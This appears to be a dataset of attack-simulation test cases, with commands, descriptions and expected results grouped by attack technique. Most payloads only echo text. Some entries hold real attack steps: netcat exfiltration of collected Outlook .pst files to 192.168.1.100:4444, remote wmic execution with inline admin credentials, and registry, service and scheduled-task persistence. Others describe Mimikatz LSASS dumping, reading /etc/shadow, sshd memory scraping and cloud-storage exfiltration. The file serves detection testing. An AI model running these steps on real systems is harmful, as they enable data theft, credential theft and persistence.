attacks.expected_behavior: Prints each window's ID, title, and geometry (position and size), providing detailed window information for the current X session.

attacks.description: Retrieves the system's host name and all assigned IP addresses (both IPv4 and IPv6) using built‑in hostname utilities.
attacks.expected_behavior: Outputs the host name on the first line followed by a space‑separated list of IP addresses on the second line.

attacks.command: ip addr show && cat /etc/resolv.conf | grep '^nameserver' | awk '{print $2}'
attacks.description: Displays detailed network interface information and extracts the configured DNS server IPs from the resolver configuration.
attacks.expected_behavior: First part lists each network interface with its IP addresses; second part prints each nameserver IP found in /etc/resolv.conf, one per line.

attacks.command: uname -a && cat /etc/os-release && hostname -f && ip -o -4 addr list | awk '{print $4}'
attacks.description: Collects comprehensive system details: kernel and architecture (uname), OS release information, fully qualified domain name, and a concise list of IPv4 addresses for all interfaces.
attacks.expected_behavior: Outputs kernel/arch line, then key/value OS release lines, then the FQDN, and finally each IPv4 address in CIDR notation on separate lines.

attacks.description: Basic PowerShell execution that prints a test string to the console.
attacks.expected_behavior: The command outputs 'PowerShell basic execution test' to STDOUT.

attacks.description: Intermediate command that uses PowerShell to invoke schtasks.exe to create a one‑time scheduled task which writes a file to the TEMP directory.
attacks.expected_behavior: A scheduled task named 'TestTask' is created; when it runs it creates a file 'advanced.txt' in %TEMP% containing the word 'Advanced'.

attacks.command: powershell -Command \"$script = 'Write-Output ''Advanced PowerShell payload'''; $path = \\\"$env:TEMP\\adv.ps1\\\"; Set-Content -Path $path -Value $script -Force; powershell -ExecutionPolicy Bypass -File $path\"
attacks.description: Advanced command that creates a temporary PowerShell script file with a payload and then executes it via a second PowerShell process.
attacks.expected_behavior: A file 'adv.ps1' is written to the TEMP directory containing a Write-Output statement; the second PowerShell invocation runs the script, resulting in the payload text being printed.

attacks.description: Basic file download using PowerShell's Invoke-WebRequest
attacks.expected_behavior: Downloads test.txt from example.com to the user's TEMP directory.

attacks.description: Intermediate encoded command writing test content to TEMP
attacks.expected_behavior: Creates ps_test.txt in TEMP with 'PowerShell test' content using Base64-encoded command.

attacks.description: Advanced loop creating multiple files with forced overwrite
attacks.expected_behavior: Generates loopfile_1.txt, loopfile_2.txt, loopfile_3.txt in TEMP with simple content using loop logic.

attacks.command: schtasks.exe /Create /S TARGET /RU SYSTEM /SC ONCE /ST 00:00 /TR "cmd.exe /c echo test > %TEMP%\\remote.txt" /TN "TestTask" && schtasks.exe /Run /S TARGET /TN "TestTask"
attacks.description: Creates a one‑time scheduled task on the remote host that runs a harmless echo command, then triggers the task immediately.
attacks.expected_behavior: A scheduled task named TestTask is created on the remote machine and executed, resulting in a file remote.txt containing the word 'test' in the remote %TEMP% directory.

attacks.command: wmic /node:"TARGET" /user:"Administrator" /password:"password" process call create "cmd.exe /c echo wmic test > %TEMP%\\wmic.txt"
attacks.description: Uses WMI to remotely start a process on the target that writes a test string to a temporary file.
attacks.expected_behavior: The remote host executes the command, creating wmic.txt in its %TEMP% folder containing the text 'wmic test'.

attacks.command: sc.exe \\TARGET create TestService binPath= "cmd.exe /c echo service > %TEMP%\\service.txt" start= auto && sc.exe \\TARGET start TestService
attacks.description: Creates a new Windows service on the remote system that runs a harmless echo command, then starts the service.
attacks.expected_behavior: A service named TestService is installed and started on the remote host, resulting in a file service.txt in the remote %TEMP% directory containing the word 'service'.

attacks.description: Copies any Outlook .pst files from the default user folder to the temporary directory for later analysis.
attacks.expected_behavior: The .pst files are duplicated in %TEMP%; if none exist, the command silently fails with a file not found message.

attacks.description: Compresses discovered .pst files into a zip archive and then base64‑encodes the archive using certutil, storing the result in %TEMP%.
attacks.expected_behavior: A zip file named pst_collection.zip is created in %TEMP% containing the .pst files, followed by a .b64 file with the base64 representation of the zip.

attacks.description: Basic collection: locate .pst files in the current user's home directory and copy them to a temporary staging folder.
attacks.expected_behavior: Creates /tmp/pst_collection if it does not exist, then copies any .pst files found under $HOME into that directory.

attacks.command: mkdir -p /tmp/pst_collection && find /home -type f -name "*.pst" -exec cp {} /tmp/pst_collection/ \; && tar -czf /tmp/pst_archive.tar.gz -C /tmp pst_collection
attacks.description: Intermediate collection: gather .pst files from all user home directories, stage them, and compress into a tar.gz archive.
attacks.expected_behavior: Copies .pst files from /home/* into /tmp/pst_collection, then creates /tmp/pst_archive.tar.gz containing the collected files.

attacks.command: mkdir -p /tmp/pst_collection && find /home -type f -name "*.pst" -exec cp {} /tmp/pst_collection/ \; && tar -czf - -C /tmp pst_collection | openssl enc -aes-256-cbc -salt -pass pass:TestPass | nc -w 3 192.168.1.100 4444
attacks.description: Advanced collection: collect .pst files, stream a compressed and AES‑encrypted archive directly to a remote listener via netcat.
attacks.expected_behavior: Copies .pst files from all /home directories into /tmp/pst_collection, then creates a tar archive on‑the‑fly, encrypts it with OpenSSL, and sends the ciphertext to 192.168.1.100 on port 4444 using netcat.

attacks.description: Basic command execution using cmd.exe to create a file in the temp directory.
attacks.expected_behavior: Creates a file named test.txt in the user's temp directory with the content 'Hello'.

attacks.description: Intermediate command using PowerShell to display a message box.
attacks.expected_behavior: Displays a message box with the text 'Hello, World!'.

attacks.description: Advanced command that writes to the console and then executes another command to create a file.
attacks.expected_behavior: Writes 'Executing command...' to the console and creates a file named advanced_test.txt in the temp directory with the content 'Test'.

attacks.description: Basic use of the echo command to write a string to a temporary file.
attacks.expected_behavior: Creates /tmp/command_test.txt containing the text 'Hello from test'.

attacks.command: bash -c 'for i in {1..5}; do echo "Iteration $i" >> /tmp/loop_output.txt; done'
attacks.description: Intermediate example using a bash loop to append multiple lines to a file.
attacks.expected_behavior: Appends five lines (Iteration 1‑5) to /tmp/loop_output.txt.

attacks.command:
cat <<'EOF' > /tmp/malicious.sh
#!/bin/bash
# Simulated payload
echo "Simulated payload execution" > /tmp/payload.log
EOF
chmod +x /tmp/malicious.sh
/tmp/malicious.sh
attacks.description: Advanced example creating a temporary script via heredoc, marking it executable, and running it.
attacks.expected_behavior: Writes a script to /tmp/malicious.sh, makes it executable, runs it, and creates /tmp/payload.log containing the message 'Simulated payload execution'.

attacks.description: Creates a base64‑encoded placeholder Mimikatz binary, decodes it with certutil, and runs Mimikatz to dump credentials from LSASS.
attacks.expected_behavior: A file mimikatz.exe is written to %TEMP%, decoded, and executed. Mimikatz outputs extracted logon passwords and hashes to the console.

attacks.description: Runs an existing Mimikatz binary via PowerShell to dump LSASS credentials using the privilege::debug and sekurlsa::logonpasswords modules.
attacks.expected_behavior: PowerShell launches mimikatz.exe, which prints extracted credentials from the LSASS process to the console.

attacks.description: Uses the built‑in comsvcs.dll MiniDump function to create a dump of LSASS, then runs Mimikatz on the dump to extract credentials.
attacks.expected_behavior: A memory dump of LSASS (lsass.dmp) is created in %TEMP%, after which Mimikatz processes the dump and outputs credential information.

attacks.description: Directly reads the system password file to dump hashed user credentials.
attacks.expected_behavior: Outputs the contents of /etc/shadow to stdout, showing username and password hash entries.

attacks.description: Inspects the memory of the sshd daemon for plaintext password strings.
attacks.expected_behavior: Prints any ASCII strings containing the word 'password' that are present in the sshd process memory.

attacks.description: Creates a core dump of the sshd process, then extracts potential credential strings from the dump.
attacks.expected_behavior: Generates a core file in /tmp, runs strings on it, and outputs lines that look like password or secret identifiers.

attacks.command: sc create TestService binPath= "cmd.exe /c echo ServiceCreated > %TEMP%\\svc.txt" start= auto
attacks.description: Creates a new Windows service named TestService that runs a harmless echo command at startup.
attacks.expected_behavior: A new service called TestService is registered and set to start automatically; when the service starts, it writes a file svc.txt in the TEMP folder.

attacks.command: reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v TestRun /t REG_SZ /d "cmd.exe /c echo RegistryRun > %TEMP%\\reg.txt" /f
attacks.description: Adds a Run registry key under the current user to execute a benign command at logon.
attacks.expected_behavior: A new value TestRun is added to HKCU\Run; on the next user logon, the command creates reg.txt in the TEMP folder.

attacks.description: Registers a scheduled task that runs a harmless echo command each time the user logs on.
attacks.expected_behavior: A scheduled task named TestTask is created; on each logon, it writes task.txt to the TEMP directory.

attacks.description: Start the nginx service using systemctl
attacks.expected_behavior: The nginx service will be started, and the system process will be created or modified

attacks.description: Update the systemd configuration to start nginx automatically on boot
attacks.expected_behavior: The nginx service will be configured to start automatically on boot, modifying the system process

attacks.description: Open the cron table for editing to schedule a system process
attacks.expected_behavior: The cron table will be opened for editing, allowing the user to schedule a system process

attacks.technique_name: Exfiltration Over Web Service: Exfiltration to Cloud Storage
attacks.description: Basic upload using curl to the Google Drive API with a pre‑generated API key. The file /tmp/test.txt is sent as multipart/form‑data.
attacks.expected_behavior: The file test.txt is uploaded to the authenticated Google Drive account; the API returns a JSON response containing the file ID.

attacks.technique_name: Exfiltration Over Web Service: Exfiltration to Cloud Storage
attacks.description: Intermediate upload using the `gdrive` CLI tool. The `--parent` flag specifies the destination folder ID on Google Drive.
attacks.expected_behavior: The tool authenticates with the stored OAuth token and uploads test.txt to the specified Drive folder, printing the new file ID on success.

attacks.technique_name: Exfiltration Over Web Service: Exfiltration to Cloud Storage
attacks.description: Advanced exfiltration using `rclone` with a pre‑configured remote named `remote` that points to a Google Drive account. Copies the directory or file to the remote folder.
attacks.expected_behavior: rclone authenticates using the stored credentials and transfers the contents of /tmp/secret_data to the Google Drive folder `backup_folder`, showing a progress bar.

attacks.description: Creates a script whose contents are base64‑encoded, decodes it at runtime, makes it executable and runs it.
attacks.expected_behavior: The decoded script prints "Hello world!" to stdout.

attacks.description: Stores a gzip‑compressed script, base64‑encodes it, then decodes and decompresses it before execution, hiding the original code.
attacks.expected_behavior: The script prints "Obfuscated execution" when run.

attacks.description: Builds the command string using escaped hexadecimal byte values, then evaluates it, demonstrating character‑level obfuscation.
attacks.expected_behavior: Outputs the text "Advanced Obfuscation".

attacks.description: Creates a scheduled task named TestTask that runs at user logon and writes a test string to a file in the TEMP directory.
attacks.expected_behavior: The task is registered; at the next logon the command executes, creating %TEMP%\task_output.txt containing 'ScheduledTaskRun'.

attacks.command: powershell -Command "$action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c echo AdvancedTask > $env:TEMP\\adv.txt'; $trigger = New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -TaskName 'AdvTask' -Action $action -Trigger $trigger -RunLevel Limited -Force"
attacks.description: Uses PowerShell to register a startup scheduled task that runs a hidden cmd.exe command writing a test string to a file in TEMP.
attacks.expected_behavior: A task named AdvTask is created; it runs at system startup and creates %TEMP%\adv.txt with the text 'AdvancedTask'.

attacks.command: echo "Write-Output 'EncodedTask' | Out-File -FilePath $env:TEMP\\encoded_task.ps1 -Encoding ASCII" > %TEMP%\\create_script.bat && cmd /c %TEMP%\\create_script.bat && schtasks /Create /TN "EncodedTask" /TR "powershell -ExecutionPolicy Bypass -File \"%TEMP%\\encoded_task.ps1\"" /SC DAILY /ST 00:01 /RL HIGHEST /F
attacks.description: Stages a PowerShell script in %TEMP% that writes a test string, then creates a daily scheduled task with highest run level to execute that script.
attacks.expected_behavior: The batch command creates encoded_task.ps1 in TEMP; schtasks registers a task named EncodedTask that runs daily at 00:01, executing the script which creates %TEMP%\\encoded_task.ps1 output file containing 'EncodedTask'.

attacks.description: Opens the cron table for editing, allowing for the addition of new scheduled tasks.
attacks.expected_behavior: The default text editor will open, displaying the cron table. The user can then add, modify, or delete scheduled tasks.

attacks.description: Adds a new scheduled task that executes a benign command at midnight every day.
attacks.expected_behavior: A new cron job will be added, which will execute the `/bin/echo` command at midnight every day, printing 'Scheduled task executed' to the standard output.

attacks.description: Adds a new scheduled task using a variable for the command, demonstrating an intermediate level of complexity.
attacks.expected_behavior: A new cron job will be added, which will execute the `/bin/echo` command at midnight every day, printing 'Scheduled task executed' to the standard output. The use of a variable for the command adds complexity to the task.

attacks.description: Appends a harmless echo command to the user's .bashrc so it runs on every new shell session.
attacks.expected_behavior: When the user opens a new terminal or logs in, the added echo line executes and prints the test message.

attacks.description: Create a text file that prompts the user to enter their password, simulating a phishing attack.
attacks.expected_behavior: A text file named phishing.txt will be created in the current directory, containing the prompt to enter a password.

attacks.command: mkdir phishing_directory && echo 'You have been phished!' > phishing_directory/phishing.txt
attacks.description: Create a directory and a text file inside it, containing a message that could be used in a phishing attack.
attacks.expected_behavior: A directory named phishing_directory will be created in the current directory, containing a text file named phishing.txt with the message 'You have been phished!'.

attacks.description: Create a text file containing a URL that could be used in a phishing attack.
attacks.expected_behavior: A text file named phishing_link.txt will be created in the current directory, containing the URL https://example.com/phishing_site.

attacks.description: Basic execution of a malicious script
attacks.expected_behavior: The script /tmp/malicious.sh will be executed by the bash interpreter.

attacks.description: Intermediate scenario downloading a 'malicious' script and executing it
attacks.expected_behavior: A script named malicious.sh will be downloaded from example.com and then executed by bash. Note: This command assumes curl is available and internet access is present for demonstration purposes.

attacks.command: echo 'echo "This is a benign malicious file"' > /tmp/malicious.sh && chmod +x /tmp/malicious.sh && /tmp/malicious.sh
attacks.description: Advanced scenario creating, making executable, and running a 'malicious' file
attacks.expected_behavior: A file named malicious.sh will be created in /tmp, made executable, and then executed, printing 'This is a benign malicious file' to the console.
